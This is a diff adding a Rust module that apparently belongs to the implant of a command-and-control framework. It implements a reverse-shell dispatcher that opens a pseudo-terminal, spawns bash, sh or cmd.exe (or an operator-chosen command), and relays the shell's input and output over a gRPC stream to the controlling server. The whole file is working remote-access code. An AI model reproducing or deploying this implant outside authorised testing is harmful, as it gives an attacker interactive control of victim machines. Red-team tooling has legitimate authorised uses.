@@ -1,0 +1,148 @@
+use super::Dispatcher;
+use anyhow::Result;
+use pb::c2::{ReverseShellMessageKind, ReverseShellRequest};
+use portable_pty::{native_pty_system, CommandBuilder, PtySize};
+use std::path::Path;
+use transport::Transport;
+
+/*
+ * ReverseShellMessage will open a reverse shell when dispatched.
+ */
+#[cfg_attr(debug_assertions, derive(Debug))]
+#[derive(Clone)]
+pub struct ReverseShellPTYMessage {
+    pub(crate) id: i64,
+    pub(crate) cmd: Option<String>,
+}
+
+impl Dispatcher for ReverseShellPTYMessage {
+    async fn dispatch(self, transport: &mut impl Transport) -> Result<()> {
+        let task_id = self.id;
+
+        #[cfg(debug_assertions)]
+        log::info!("starting reverse_shell_pty (task_id={})", task_id);
+
+        // Use the native pty implementation for the system
+        let pty_system = native_pty_system();
+
+        // Create a new pty
+        let pair = pty_system.openpty(PtySize {
+            rows: 24,
+            cols: 80,
+            pixel_width: 0,
+            pixel_height: 0,
+        })?;
+
+        // Spawn command into the pty
+        let cmd = match self.cmd {
+            Some(cmd) => CommandBuilder::new(cmd),
+            None => {
+                // Default /bin/bash, fallback to sh if unavailable
+                #[cfg(not(target_os = "windows"))]
+                if Path::new("/bin/bash").exists() {
+                    CommandBuilder::new("/bin/bash")
+                } else {
+                    CommandBuilder::new("/bin/sh")
+                }
+
+                // Default to cmd.exe on Windows
+                #[cfg(target_os = "windows")]
+                CommandBuilder::new("cmd.exe")
+            }
+        };
+
+        // Appologies for the exclusionary language in the portable_pty dependency :(
+        // We welcome PRs to replace this dependency / wrap it in more inclusive language
+        let _child = pair.slave.spawn_command(cmd)?;
+        let mut reader = pair.master.try_clone_reader()?;
+        let mut writer = pair.master.take_writer()?;
+
+        // Buffer must only be 1
+        // gRPC will only send when buffer is over-filled
+        let (output_tx, output_rx) = tokio::sync::mpsc::channel(1);
+
+        // Spawn task to send PTY output
+        const CHUNK_SIZE: usize = 1024; // 1 KB Limit (/chunk)
+        tokio::spawn(async move {
+            loop {
+                // Read output from the PTY
+                let mut buffer = [0; CHUNK_SIZE];
+                let n = match reader.read(&mut buffer[..]) {
+                    Ok(n) => n,
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("failed to read pty: {}", _err);
+
+                        break;
+                    }
+                };
+
+                // Send output to gRPC
+                match output_tx
+                    .send(ReverseShellRequest {
+                        kind: ReverseShellMessageKind::Data.into(),
+                        data: buffer[..n].to_vec(),
+                        task_id,
+                    })
+                    .await
+                {
+                    Ok(_) => {
+                        #[cfg(debug_assertions)]
+                        log::debug!("{}", String::from_utf8_lossy(&buffer[..n]));
+                    }
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("reverse_shell_pty output failed to queue: {}", _err);
+
+                        break;
+                    }
+                }
+
+                // Send a ping to force the channel to be flushed
+                match output_tx
+                    .send(ReverseShellRequest {
+                        kind: ReverseShellMessageKind::Ping.into(),
+                        data: Vec::new(),
+                        task_id,
+                    })
+                    .await
+                {
+                    Ok(_) => {}
+                    Err(_err) => {
+                        #[cfg(debug_assertions)]
+                        log::error!("reverse_shell_pty ping failed: {}", _err);
+
+                        break;
+                    }
+                }
+            }
+        });
+
+        // Wrap PTY output receiver in stream
+        let req_stream = tokio_stream::wrappers::ReceiverStream::new(output_rx);
+
+        // Initiate gRPC stream
+        let mut stream = transport.reverse_shell(req_stream).await?.into_inner();
+        while let Some(msg) = stream.message().await? {
+            match writer.write_all(&msg.data) {
+                Ok(_) => {}
+                Err(_err) => {
+                    #[cfg(debug_assertions)]
+                    log::error!("reverse_shell_pty failed to write input: {}", _err);
+                }
+            };
+        }
+
+        #[cfg(debug_assertions)]
+        log::info!("stopping reverse_shell_pty (task_id={})", task_id);
+
+        Ok(())
+    }
+}
+
+#[cfg(debug_assertions)]
+impl PartialEq for ReverseShellPTYMessage {
+    fn eq(&self, other: &Self) -> bool {
+        self.id == other.id
+    }
+}
